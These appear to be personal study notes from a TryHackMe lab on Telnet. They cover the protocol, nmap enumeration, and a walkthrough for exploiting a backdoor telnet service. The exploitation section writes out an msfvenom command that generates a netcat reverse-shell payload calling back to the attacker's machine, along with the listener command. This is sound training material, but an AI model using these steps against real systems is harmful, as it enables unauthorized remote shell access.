# Telnet

## **What is Telnet ?**

Application protocol → connect and execute commands on a remote machine that's hosting a telnet server → with the telnet client 

Less used today ( because all messages are sent in clear + no specific security mechanisms ) 

**syntax** : **telnet [ip] [port]**

## Enumeration :

-oN → put the results of the scan in a file ( useful to grep infos we want ) 

nmap -A -p- -V $ip → do a scan of all ports and not only the 1000 first one

→ I instead used "nmap -A -v -p 0-10000 ( because I knew it was in this range on THM ) 

## Exploiting :

As always → looking to CVE of Telnet

→ but most of the misconfiguration in how telnet has been configured ( human makes error ) 

**method :**

- We know from enumeration that there is a poorly hidden telnet service running on the machine
- the name of it is "backdoor"
- Maybe the username is "Skidy" :

![Untitled](Telnet%208e701eec7dca4b5bb205fff4b88ac617/Untitled.png)

**connecting to telnet :** 

**telnet [ip] [port]**

→ we try some commands but it doesn't do anything 

→ starting a tcpdump 

***sudo tcpdump ip proto \\icmp -i eth0*** ( because we're on a THM's machine, use tun0 instead  ) use this exact syntax 

→ after that we try to ping on the telnet machine our personal ip and it works youhou 

→ we're able to use commands we want 

[reverse shell : ](Telnet%208e701eec7dca4b5bb205fff4b88ac617/reverse%20shell%20c5ea816b5dd24a55bd35d15ec03a065f.md)

![Untitled](Telnet%208e701eec7dca4b5bb205fff4b88ac617/Untitled%201.png)

**Using msfvenom :**

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format

After creating this payload → start a netcat listener on our local machine :

**"nc -lvp [listening port]"**

→ and after that we c/p the payload into the telnet session